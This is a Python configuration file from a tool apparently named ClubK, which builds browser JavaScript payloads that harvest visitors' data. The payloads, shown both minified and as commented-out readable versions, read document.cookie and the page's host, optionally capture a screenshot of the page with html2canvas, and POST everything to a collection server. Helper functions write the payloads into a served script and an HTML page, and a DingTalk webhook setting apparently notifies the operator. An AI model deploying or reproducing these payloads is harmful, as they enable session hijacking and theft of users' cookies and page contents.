# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：config.py
# Author   ：0xsdeo
# Date     ：2024/9/28 01:28

HOST = "http://127.0.0.1:5000"

pem = r'ssl/'
key = r'ssl/'

default_js = "request.js"

waiting_time = 3  # 单位为秒

dingtalk_bot_Webhook = ""
dingtalk_bot_secret = ""

get_cookie_js = """!function(){let t={cookie:document.cookie,hostname:window.location.hostname,host:window.location.host},o=new XMLHttpRequest;o.open("post",\"""" + HOST + "/request" + """\"),o.setRequestHeader("Content-Type","application/json"),o.send(JSON.stringify(t))}();"""
get_screenshot_js = """!function(){var e=(new Date).getTime();function t(){html2canvas(document.body,{useCORS:true,allowTaint:true}).then(function(canvas){var t=new Image;t.src=canvas.toDataURL("image/jpeg");let n={cookie:document.cookie,hostname:window.location.hostname,host:window.location.host,image:t.src},o=new XMLHttpRequest;o.open("post",\"""" + HOST + "/request" + """\"),o.setRequestHeader("Content-Type","application/json"),o.send(JSON.stringify(n))}).catch(function(){let e={cookie:document.cookie,hostname:window.location.hostname,host:window.location.host},t=new XMLHttpRequest;t.open("post",\"""" + HOST + "/request" + """\"),t.setRequestHeader("Content-Type","application/json"),t.send(JSON.stringify(e))})}if(window.attachEvent)window.attachEvent("onload",t);else if(window.addEventListener){window.addEventListener("load",o=>{(new Date).getTime()-e<=""" + str(
    waiting_time * 1000 + 100) + """&&(clearInterval(n),t())});var n=setTimeout(function(){t()},""" + str(
    waiting_time * 1000) + """)}}();"""


def generate_js(choice=False):
    if choice:
        with open("static/html2canvas.min.js", "r", encoding="utf-8") as to_image_js:
            html2canvas = to_image_js.read()
            with open("static/request.js", "w", encoding="utf-8") as _:
                _.write(html2canvas + '\n' + get_screenshot_js)
    else:
        with open("static/request.js", "w", encoding="utf-8") as _:
            _.write(get_cookie_js)


def generate_html(js=default_js):
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <script src="{{url_for('static',filename='""" + js + """')}}"></script>
</head>
<body>

</body>
</html>"""
    with open("templates/index.html", "w", encoding="utf-8") as f:
        f.write(html)

# js = """(function () {
#     let a = {
#         cookie: document.cookie,
#         hostname : window.location.hostname,
#         host : window.location.host
#     }
#
#     let xhr = new XMLHttpRequest;
#     xhr.open("post", \"""" + HOST + "/request" + """\");
#     xhr.setRequestHeader("Content-Type", "application/json");
#     xhr.send(JSON.stringify(a))
# })()"""

# get_screenshot_js = """(function(){
#     var start_time = new Date().getTime();
#
#     function onload2(){
#
#         html2canvas(document.body.{
#             useCORS: true,
#             allowTaint: true
#         }).then(function(canvas) {
#                 var img = new Image();
#                 img.src = canvas.toDataURL("image/jpeg")
#                 re_image = img.src
#
#                 let t = {
#                         cookie: document.cookie,
#                         hostname: window.location.hostname,
#                         host: window.location.host,
#                         image: re_image
#                     },
#                     o = new XMLHttpRequest;
#                 o.open("post",\"""" + HOST + "/request" + """\"), o.setRequestHeader("Content-Type", "application/json"), o.send(JSON.stringify(t))
#     })
#             .catch(function () {
#                 let t = {
#                         cookie: document.cookie,
#                         hostname: window.location.hostname,
#                         host: window.location.host
#                     },
#                     o = new XMLHttpRequest;
#                 o.open("post",\"""" + HOST + "/request" + """\"), o.setRequestHeader("Content-Type", "application/json"), o.send(JSON.stringify(t))
#     });
# }
#
#     if (window.attachEvent){
#         window.attachEvent("onload", onload2);
#     } else if (window.addEventListener) {
#         window.addEventListener("load", (event) => {
#             var end_time = new Date().getTime();
#             if (end_time-start_time <= 3100) {
#                 clearInterval(temp);
#                 onload2();
#             }
#             else{
#
#             }
#           });
#         var temp = setTimeout(function () {
#             onload2();
#         }, 3000)
#     }
# })()"""
